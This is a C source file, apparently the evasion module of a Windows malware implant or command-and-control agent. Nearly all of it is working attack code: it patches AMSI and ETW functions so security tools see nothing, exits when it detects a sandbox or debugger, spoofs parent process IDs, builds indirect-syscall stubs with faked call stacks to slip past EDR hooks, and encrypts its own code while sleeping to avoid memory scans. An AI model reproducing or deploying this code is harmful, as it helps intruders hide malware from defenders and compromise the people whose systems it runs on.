#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <ctype.h>
#include "evasion.h"
#include "api_resolve.h"

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif


typedef BOOL  (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG  (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);
typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
typedef HANDLE(WINAPI *CreateTimerQueue_t)(void);
typedef BOOL  (WINAPI *CreateTimerQueueTimer_t)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef BOOL  (WINAPI *DeleteTimerQueueEx_t)(HANDLE, HANDLE);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);

/* All in .data/.bss — always accessible, even when .text is protected. */
static VProt_t               g_VProt                 = NULL;
static NtDelay_t             g_NtDelay               = NULL;
static CreateEventA_t        g_CreateEvent           = NULL;
static SetEvent_t            g_SetEvent              = NULL;
static CloseHandle_t         g_CloseHandle           = NULL;
static CreateTimerQueue_t    g_CreateTimerQueue      = NULL;
static CreateTimerQueueTimer_t g_CreateTimerQueueTimer = NULL;
static DeleteTimerQueueEx_t  g_DeleteTimerQueueEx    = NULL;
static WaitForSingleObject_t g_WaitForSingleObject   = NULL;
static void                 *g_text                  = NULL;
static SIZE_T                g_tsz                   = 0;

/* Context passed to both timer callbacks — lives in .data. */
typedef struct { void *text; SIZE_T text_sz; HANDLE event; } EkkoCtx;
static EkkoCtx g_ekko_ctx;

/* Count of active pipe-server conn_threads. When > 0, sleep_masked skips the
 * PAGE_NOACCESS step to avoid faulting threads executing in .text. */
static volatile LONG g_conn_thread_count = 0;

void evasion_conn_enter(void) { InterlockedIncrement(&g_conn_thread_count); }
void evasion_conn_leave(void) { InterlockedDecrement(&g_conn_thread_count); }

/* ── Startup helpers (run from .text before any sleep masking) ─────────── */

static void patch_fn(const char *mod, const char *sym) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    if (!h) return;
    FARPROC fn = GetProcAddress(h, sym);
    if (!fn) return;
    /* xor eax,eax; ret — returns AMSI_RESULT_CLEAN (0) / S_OK (0) */
    unsigned char p[3] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
    memcpy((void*)fn, p, 3);
    VirtualProtect((void*)fn, 3, old, &old);
}

static void find_text(void) {
    HMODULE base = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (memcmp(s->Name, ".text", 5) == 0) {
            g_text = (BYTE*)base + s->VirtualAddress;
            g_tsz  = s->Misc.VirtualSize;
            return;
        }
    }
}

/* ── Sandbox / analysis environment detection ──────────────────────────────
 * Score-based: exits silently if score >= 4.  Called before evasion_init().
 */
void sandbox_check(void) {
    if (IsDebuggerPresent()) ExitProcess(0);  /* immediate */

    int score = 0;

    /* CPU count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) score++;

    /* RAM */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        if (ms.ullTotalPhys < (ULONGLONG)512  * 1024 * 1024) score += 3;
        else if (ms.ullTotalPhys < (ULONGLONG)1024 * 1024 * 1024) score++;
    }

    /* Disk C: */
    ULARGE_INTEGER totalBytes;
    totalBytes.QuadPart = 0;
    if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL))
        if (totalBytes.QuadPart < (ULONGLONG)40 * 1024 * 1024 * 1024) score++;

    /* Username */
    char username[128] = {0};
    DWORD u_sz = sizeof(username);
    GetUserNameA(username, &u_sz);
    char low_u[128] = {0};
    for (int i = 0; username[i] && i < 127; i++)
        low_u[i] = (char)tolower((unsigned char)username[i]);
    const char *bad[] = {"sandbox","malware","virus","analyst","cuckoo","maltest","vmuser","tequilaboomboom"};
    for (int i = 0; i < 8; i++)
        if (strstr(low_u, bad[i])) { score += 3; break; }

    if (score >= 4) ExitProcess(0);
}

/* ── PPID spoofing — spawn a process with a fake parent PID ─────────────── */
int spawn_with_ppid(const char *cmd, const char *parent_name) {
    char lp[MAX_PATH] = {0};
    for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++)
        lp[i] = (char)tolower((unsigned char)parent_name[i]);

    /* Walk the process list and try each matching process in order.
     * Skip PID 0 (Idle) and PID 4 (System) — they cannot be opened.
     * Try all candidates so a protected/exited process doesn't block us. */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    /* Collect up to 8 candidate PIDs without holding the snapshot open */
    DWORD candidates[8] = {0};
    int   ncand = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;
            char narrow[MAX_PATH] = {0};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
                                narrow, sizeof(narrow)-1, NULL, NULL);
            char lo[MAX_PATH] = {0};
            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++)
                lo[i] = (char)tolower((unsigned char)narrow[i]);
            if (strcmp(lo, lp) == 0 && ncand < 8)
                candidates[ncand++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!ncand) return 0;

    /* Try each candidate until one succeeds */
    HANDLE hParent = NULL;
    for (int i = 0; i < ncand; i++) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, candidates[i]);
        if (hParent) break;
    }
    if (!hParent) return 0;

    SIZE_T attr_sz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attr_sz);
    if (!attrList) { CloseHandle(hParent); return 0; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attr_sz)) {
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent), NULL, NULL)) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }

    STARTUPINFOEXW siEx;
    ZeroMemory(&siEx, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.lpAttributeList = attrList;

    int wcmd_len = MultiByteToWideChar(CP_UTF8, 0, cmd, -1, NULL, 0);
    if (wcmd_len <= 0) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wcmd_len * sizeof(WCHAR));
    if (!wcmd) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    MultiByteToWideChar(CP_UTF8, 0, cmd, -1, wcmd, wcmd_len);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    /* No CREATE_SUSPENDED — resume flag is an extra EDR hook target and is
     * unnecessary for PPID spoofing.  CREATE_NEW_PROCESS_GROUP isolates
     * Ctrl+C / console signal inheritance from the agent's session. */
    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
        NULL, NULL, &siEx.StartupInfo, &pi);
    DWORD cp_err = GetLastError();   /* capture immediately before any other call */

    HeapFree(GetProcessHeap(), 0, wcmd);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    if (!ok) { SetLastError(cp_err); return 0; }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

/* Thread wrapper — SEH via AddVectoredExceptionHandler (registered in
 * evasion_init) catches any exception from inside CreateProcessW.
 * The error from CreateProcessW is captured inside spawn_with_ppid and
 * stored in w->err so WaitForSingleObject + CloseHandle can't clobber it. */
DWORD WINAPI ppid_worker(LPVOID arg) {
    PpidWork *w = (PpidWork *)arg;
    w->ok  = spawn_with_ppid(w->cmd, w->parent);
    w->err = (w->ok == 1) ? 0 : GetLastError();
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Phase 10: Call-stack spoofing
 *
 * 110-byte spoofed indirect-syscall stubs are built in a VirtualAlloc'd page
 * (RW → write stubs → RX).  Each stub:
 *   1. sub rsp,8  — opens a slot for the fake return address
 *   2. slides any stack-passed args (args 5-11) down by one slot
 *   3. plants a call-preceded RET address from ntdll at [RSP]
 *   4. issues an indirect syscall via a "syscall;ret" gadget also in ntdll
 *
 * The stack-walker sees a coherent ntdll call chain and no agent .text frame.
 * ═══════════════════════════════════════════════════════════════════════════ */

#define SPOOF_STUB_SIZE 110

static LPVOID    g_spoof_page    = NULL;
static int       g_spoof_count   = 0;
static int       g_spoof_ok      = 0;
static ULONG_PTR g_syscall_gadget = 0;   /* VA of ntdll "syscall;ret" */
static ULONG_PTR g_spoof_gadget   = 0;   /* VA of ntdll "call;...;ret" (the C3) */

/* Exported spoofed-stub pointers */
NtAllocVMem_t      g_NtAllocVM    = NULL;
NtProtVMem_t       g_NtProtVM     = NULL;
NtCreateThreadEx_t g_NtCreateThread = NULL;
NtDelayExec_t      g_NtDelayExec  = NULL;

/* ── PE little-endian helpers ─────────────────────────────────────────────── */
static unsigned short pe_r16(const unsigned char *p, int o) {
    return (unsigned short)p[o] | ((unsigned short)p[o+1] << 8);
}
static unsigned int pe_r32(const unsigned char *p, int o) {
    return (unsigned int)p[o]        | ((unsigned int)p[o+1] << 8) |
           ((unsigned int)p[o+2] << 16) | ((unsigned int)p[o+3] << 24);
}

/* ── SSN resolution: Hell's Gate + Halo's Gate fallback ──────────────────── */
static unsigned short spoof_get_ssn(HMODULE ntdll, const char *name) {
    const unsigned char *fn = (const unsigned char *)GetProcAddress(ntdll, name);
    if (!fn) return 0;
    /* Unpatched stub: 4C 8B D1  B8 lo hi 00 00  0F 05  C3 */
    if (fn[0]==0x4C && fn[1]==0x8B && fn[2]==0xD1 && fn[3]==0xB8)
        return (unsigned short)fn[4] | ((unsigned short)fn[5] << 8);
    /* Halo's Gate: scan forward neighbours (each stub is 32 bytes apart) */
    for (int i = 1; i <= 5; i++) {
        const unsigned char *nb = fn + (i * 32);
        if (nb[0]==0x4C && nb[1]==0x8B && nb[2]==0xD1 && nb[3]==0xB8) {
            unsigned short base_ssn = (unsigned short)nb[4] | ((unsigned short)nb[5] << 8);
            return (base_ssn >= (unsigned short)i) ? base_ssn - (unsigned short)i : 0;
        }
    }
    return 0;
}

/* ── Scan ntdll .text for "syscall;ret" (0F 05 C3) ──────────────────────── */
static ULONG_PTR spoof_find_syscall_gadget(ULONG_PTR base) {
    const unsigned char *dos = (const unsigned char *)base;
    unsigned int elf = pe_r32(dos, 60);
    const unsigned char *pe  = dos + elf;
    unsigned short nsects = pe_r16(pe, 6);
    unsigned short optsz  = pe_r16(pe, 20);
    const unsigned char *sec0 = pe + 24 + optsz;
    for (unsigned short i = 0; i < nsects; i++) {
        const unsigned char *sec = sec0 + (i * 40);
        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
            continue;
        unsigned int vaddr = pe_r32(sec, 12);
        unsigned int vsz   = pe_r32(sec, 16);
        const unsigned char *mem = (const unsigned char *)(base + vaddr);
        for (unsigned int off = 0; off + 3 <= vsz; off++)
            if (mem[off]==0x0F && mem[off+1]==0x05 && mem[off+2]==0xC3)
                return base + vaddr + off;
    }
    return 0;
}

/* ── Scan ntdll .text for "call rel32; ret" — return VA of the C3 byte ──── */
static ULONG_PTR spoof_find_spoof_gadget(ULONG_PTR base) {
    const unsigned char *dos = (const unsigned char *)base;
    unsigned int elf = pe_r32(dos, 60);
    const unsigned char *pe  = dos + elf;
    unsigned short nsects = pe_r16(pe, 6);
    unsigned short optsz  = pe_r16(pe, 20);
    const unsigned char *sec0 = pe + 24 + optsz;
    for (unsigned short i = 0; i < nsects; i++) {
        const unsigned char *sec = sec0 + (i * 40);
        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
            continue;
        unsigned int vaddr = pe_r32(sec, 12);
        unsigned int vsz   = pe_r32(sec, 16);
        const unsigned char *mem = (const unsigned char *)(base + vaddr);
        /* Require off >= 5 so mem[off-5] is always in range */
        for (unsigned int off = 5; off < vsz; off++)
            if (mem[off-5]==0xE8 && mem[off]==0xC3)
                return base + vaddr + off;
    }
    return 0;
}

/* ── Write one 110-byte spoofed stub into g_spoof_page ───────────────────── *
 *
 * Stub layout (identical to the Nim Phase-10 stubs in agent-nim/syscalls.nim):
 *  +0   48 83 EC 08               sub  rsp, 8
 *  +4   4C 8B 5C 24 30            mov  r11, [rsp+0x30]  ─┐
 *  +9   4C 89 5C 24 28            mov  [rsp+0x28], r11   │ slide args 5-11
 *  +14  ...                        (× 7 pairs, 10 B each) │ down by 8 bytes
 *  +74  49 BB <8>                  mov  r11, spoof_gadget ; fake ret addr
 *  +84  4C 89 1C 24               mov  [rsp], r11
 *  +88  4C 8B D1                  mov  r10, rcx
 *  +91  B8 lo hi 00 00            mov  eax, SSN
 *  +96  FF 25 00 00 00 00         jmp  [rip+0]
 *  +102 <8>                        → syscall_gadget
 */
static void *spoof_make_stub(unsigned short ssn) {
    if (!g_spoof_page) return NULL;
    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;

    unsigned char *p = (unsigned char *)g_spoof_page + (g_spoof_count * SPOOF_STUB_SIZE);
    g_spoof_count++;

    static const unsigned char src_slots[7] = {0x30,0x38,0x40,0x48,0x50,0x58,0x60};
    static const unsigned char dst_slots[7] = {0x28,0x30,0x38,0x40,0x48,0x50,0x58};

    /* +0: sub rsp, 8 */
    p[0]=0x48; p[1]=0x83; p[2]=0xEC; p[3]=0x08;

    /* +4..+73: 7 pairs of (mov r11,[rsp+src]; mov [rsp+dst],r11) */
    int off = 4;
    for (int i = 0; i < 7; i++) {
        p[off+0]=0x4C; p[off+1]=0x8B; p[off+2]=0x5C; p[off+3]=0x24; p[off+4]=src_slots[i];
        p[off+5]=0x4C; p[off+6]=0x89; p[off+7]=0x5C; p[off+8]=0x24; p[off+9]=dst_slots[i];
        off += 10;
    } /* off == 74 */

    /* +74: mov r11, spoof_gadget  (49 BB <8-byte LE>) */
    p[74]=0x49; p[75]=0xBB;
    memcpy(p + 76, &g_spoof_gadget, 8);

    /* +84: mov [rsp], r11  (4C 89 1C 24) */
    p[84]=0x4C; p[85]=0x89; p[86]=0x1C; p[87]=0x24;

    /* +88: mov r10, rcx  (4C 8B D1) */
    p[88]=0x4C; p[89]=0x8B; p[90]=0xD1;

    /* +91: mov eax, SSN  (B8 lo hi 00 00) */
    p[91]=0xB8; p[92]=(unsigned char)(ssn & 0xFF); p[93]=(unsigned char)(ssn >> 8);
    p[94]=0x00; p[95]=0x00;

    /* +96: jmp [rip+0]  (FF 25 00 00 00 00) */
    p[96]=0xFF; p[97]=0x25; p[98]=0x00; p[99]=0x00; p[100]=0x00; p[101]=0x00;

    /* +102: syscall gadget address  (8-byte LE) */
    memcpy(p + 102, &g_syscall_gadget, 8);

    return (void *)p;
}

/* ── Public API ───────────────────────────────────────────────────────────── */

void init_stack_spoof(void) {
    /* Use the already-loaded ntdll for SSN resolution.
     * Previously used LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) to get a
     * "clean" copy, but that caused heap corruption (FTH abcc): the loader
     * makes internal heap allocations for the module entry that are left
     * incomplete, corrupting the process heap. On unhooked targets the live
     * ntdll stubs have the standard 4C 8B D1 B8 pattern and no second copy
     * is needed; Halo's Gate neighbours handle the hooked-stub fallback. */
    HMODULE ntdll_live = GetModuleHandleA("ntdll.dll");
    if (!ntdll_live) return;

    /* Resolve SSNs (Hell's Gate / Halo's Gate) */
    unsigned short ssn_alloc = spoof_get_ssn(ntdll_live, "NtAllocateVirtualMemory");
    unsigned short ssn_prot  = spoof_get_ssn(ntdll_live, "NtProtectVirtualMemory");
    unsigned short ssn_thr   = spoof_get_ssn(ntdll_live, "NtCreateThreadEx");
    unsigned short ssn_delay = spoof_get_ssn(ntdll_live, "NtDelayExecution");

    /* Scan live (in-memory) ntdll for both gadgets */
    ULONG_PTR base = (ULONG_PTR)ntdll_live;
    g_syscall_gadget = spoof_find_syscall_gadget(base);
    g_spoof_gadget   = spoof_find_spoof_gadget(base);

    if (!g_syscall_gadget || !g_spoof_gadget) return;

    /* Allocate RW page, write stubs, then lock to RX */
    g_spoof_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_spoof_page) return;

    g_NtAllocVM      = (NtAllocVMem_t)     spoof_make_stub(ssn_alloc);
    g_NtProtVM       = (NtProtVMem_t)      spoof_make_stub(ssn_prot);
    g_NtCreateThread = (NtCreateThreadEx_t)spoof_make_stub(ssn_thr);
    g_NtDelayExec    = (NtDelayExec_t)     spoof_make_stub(ssn_delay);

    DWORD old;
    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
    g_spoof_ok = 1;
}

void *spoof_syscall_stub(unsigned short ssn) {
    if (!g_spoof_ok || !g_spoof_page) return NULL;
    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;

    /* Briefly re-open for writing, append stub, re-seal */
    DWORD old;
    if (!VirtualProtect(g_spoof_page, 4096, PAGE_READWRITE, &old)) return NULL;
    void *stub = spoof_make_stub(ssn);
    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
    return stub;
}

void amsi_bypass(void) {
    patch_fn("amsi.dll",  "AmsiScanBuffer");
    patch_fn("amsi.dll",  "AmsiScanString");
    patch_fn("ntdll.dll", "EtwEventWrite");
}

void evasion_init(void) {
    patch_fn("amsi.dll",  "AmsiScanBuffer");
    patch_fn("amsi.dll",  "AmsiScanString");
    patch_fn("ntdll.dll", "EtwEventWrite");

    HMODULE k32   = GetModuleHandleA("kernel32.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_VProt               = (VProt_t)              GetProcAddress(k32,   "VirtualProtect");
    g_NtDelay             = (NtDelay_t)            GetProcAddress(ntdll, "NtDelayExecution");
    g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32,   "CreateEventA");
    g_SetEvent            = (SetEvent_t)           GetProcAddress(k32,   "SetEvent");
    g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32,   "CloseHandle");
    g_CreateTimerQueue    = (CreateTimerQueue_t)   GetProcAddress(k32,   "CreateTimerQueue");
    g_CreateTimerQueueTimer = (CreateTimerQueueTimer_t)GetProcAddress(k32, "CreateTimerQueueTimer");
    g_DeleteTimerQueueEx  = (DeleteTimerQueueEx_t) GetProcAddress(k32,   "DeleteTimerQueueEx");
    g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32,   "WaitForSingleObject");
    find_text();
    init_stack_spoof();
}

/* ── Ekko / FOLIAGE-style timer-based sleep masking ──────────────────────
 *
 * Root problem with the naive PAGE_NOACCESS approach: the x64 Windows
 * exception dispatcher reads .pdata (which points into .text) to find unwind
 * handlers whenever ANY exception occurs during sleep, including hardware
 * faults, timer APCs, and structured exception handling.  Setting .text to
 * PAGE_NOACCESS while the main thread is parked in NtDelayExecution makes
 * the dispatcher itself fault → process crash → RST.
 *
 * Correct pattern (Ekko/FOLIAGE/Havoc/Sliver):
 *   1. Main thread calls WaitForSingleObject and parks inside ntdll — its
 *      instruction pointer is in ntdll.dll, NOT in .text.
 *   2. Timer-pool thread 1 (due=0ms): XOR-encrypt .text + PAGE_NOACCESS.
 *   3. Timer-pool thread 2 (due=ms):  PAGE_EXECUTE_READWRITE + XOR-decrypt
 *      + PAGE_EXECUTE_READ + SetEvent to wake main thread.
 *
 * Both callbacks live in .evasn so they remain executable when .text is
 * PAGE_NOACCESS.  All Windows API calls go through function pointers in
 * .data, bypassing IAT thunks that would be in the encrypted .text.
 */

__attribute__((section(".evasn"), noinline))
static VOID CALLBACK ekko_encrypt_cb(PVOID ctx, BOOLEAN unused) {
    (void)unused;
    EkkoCtx *c = (EkkoCtx*)ctx;
    unsigned char *t = (unsigned char*)c->text;
    DWORD old;
    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
    g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
}

__attribute__((section(".evasn"), noinline))
static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
    (void)unused;
    EkkoCtx *c = (EkkoCtx*)ctx;
    unsigned char *t = (unsigned char*)c->text;
    DWORD old;
    /* Restore .text before waking the main thread */
    g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old);
    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
    g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
    g_SetEvent(c->event);
}

__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    /* Fallback: unmasked sleep if init not called or pointers missing */
    if (!g_text || !g_VProt || !g_NtDelay ||
        !g_CreateEvent || !g_SetEvent || !g_CloseHandle ||
        !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
        !g_DeleteTimerQueueEx || !g_WaitForSingleObject) {
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        if (g_NtDelay) g_NtDelay(FALSE, &t);
        return;
    }

    /* Skip masking while pipe-server conn_threads are running in .text */
    if (InterlockedOr(&g_conn_thread_count, 0) > 0) {
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        g_NtDelay(FALSE, &t);
        return;
    }

    /* Bail if VirtualProtect would be blocked (HVCI / code-integrity) */
    {
        DWORD probe;
        if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) {
            LARGE_INTEGER t;
            t.QuadPart = -(LONGLONG)ms * 10000LL;
            g_NtDelay(FALSE, &t);
            return;
        }
        /* Immediately restore — we only probed */
        g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
    }

    /* Prepare shared context for the two timer callbacks */
    g_ekko_ctx.text     = g_text;
    g_ekko_ctx.text_sz  = g_tsz;
    g_ekko_ctx.event    = g_CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_ekko_ctx.event) {
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        g_NtDelay(FALSE, &t);
        return;
    }

    HANDLE hQueue = g_CreateTimerQueue();
    if (!hQueue) {
        g_CloseHandle(g_ekko_ctx.event);
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;
        g_NtDelay(FALSE, &t);
        return;
    }

    HANDLE hT1 = NULL, hT2 = NULL;
    /* Timer 1: encrypt at T=0 ms (one-shot, runs in timer thread) */
    g_CreateTimerQueueTimer(&hT1, hQueue,
                            (WAITORTIMERCALLBACK)ekko_encrypt_cb,
                            &g_ekko_ctx, 0, 0, WT_EXECUTEINTIMERTHREAD);
    /* Timer 2: decrypt at T=ms (one-shot, runs in timer thread) */
    g_CreateTimerQueueTimer(&hT2, hQueue,
                            (WAITORTIMERCALLBACK)ekko_decrypt_cb,
                            &g_ekko_ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);

    /* Park main thread inside ntdll — no .text return address is live here.
     * Extra 5 s safety margin in case the timer fires late. */
    g_WaitForSingleObject(g_ekko_ctx.event, ms + 5000);

    /* Wait for any in-progress callback to finish before freeing the queue.
     * INVALID_HANDLE_VALUE as the second arg means "block until complete". */
    g_DeleteTimerQueueEx(hQueue, (HANDLE)(LONG_PTR)(-1));
    g_CloseHandle(g_ekko_ctx.event);
    g_ekko_ctx.event = NULL;
    /* .text is now RX and decrypted — ret is safe */
}

/* ── MEM_FLUCTUATE — periodic XOR scrambler daemon ─────────────────────── */

#define MEM_SCRAMBLE_KEY 0xA7

static volatile int  g_scrambler_stop    = 0;
static int           g_scrambler_running = 0;
static HANDLE        g_scrambler_thread  = NULL;
static unsigned char g_scrambler_buf[4096];

static DWORD WINAPI scrambler_thread_proc(LPVOID p) {
    DWORD interval_ms = (DWORD)(uintptr_t)p;
    int encrypted = 0;
    while (!g_scrambler_stop) {
        Sleep(interval_ms);
        if (g_scrambler_stop) break;
        for (int i = 0; i < 4096; i++)
            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
        encrypted = !encrypted;
    }
    if (encrypted)
        for (int i = 0; i < 4096; i++)
            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
    return 0;
}

void mem_fluctuate_stop(void) {
    if (!g_scrambler_running) return;
    g_scrambler_stop = 1;
    if (g_scrambler_thread) {
        WaitForSingleObject(g_scrambler_thread, 5000);
        CloseHandle(g_scrambler_thread);
        g_scrambler_thread = NULL;
    }
    g_scrambler_running = 0;
    g_scrambler_stop    = 0;
}

void mem_fluctuate_start(int interval_sec) {
    mem_fluctuate_stop();
    DWORD ms = (DWORD)(interval_sec > 0 ? interval_sec : 10) * 1000;
    g_scrambler_stop   = 0;
    g_scrambler_thread = CreateThread(NULL, 0, scrambler_thread_proc,
        (LPVOID)(uintptr_t)ms, 0, NULL);
    if (g_scrambler_thread) g_scrambler_running = 1;
}
